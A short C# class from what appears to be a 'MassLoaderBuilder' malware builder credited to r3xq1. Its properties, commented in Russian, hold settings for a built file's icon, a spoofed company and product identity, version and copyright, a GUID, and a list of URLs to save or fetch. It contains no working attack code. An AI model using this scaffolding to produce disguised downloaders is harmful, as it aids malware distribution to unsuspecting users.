namespace MassLoaderBuilder
{
    using System.Windows.Forms;

    /*
        Created by r3xq1
        https://github.com/r3xq1/
        Telegram: https://t.me/r3xq1
    */

    public class Build
    {
        #region String properties 

        public string BoxIcon { get; set; } // Иконка для билд файла
        public string BoxFileName { get; set; } // Имя билд файла
        public string AssTitle { get; set; } // Заголовок
        public string AssDescription { get; set; } // Дескриптор
        public string AssCompany { get; set; } // Имя компании
        public string AssProduct { get; set; } // Имя продукта
        public string AssCopyright { get; set; } // Копирайт
        public string AssVersion { get; set; } // Версия
        public string AssFileVersion { get; set; } // Версия файла
        public string GuidBox { get; set; } // GUID
        public string ComboPath { get; set; } // Путь сохранения ссылок
        public string ListBoxUrl { get; set; }

        #endregion

        #region Controls propetries

        public Label LMessage { get; set; }
        public NumericUpDown NUp { get; set; }

        #endregion
    }
}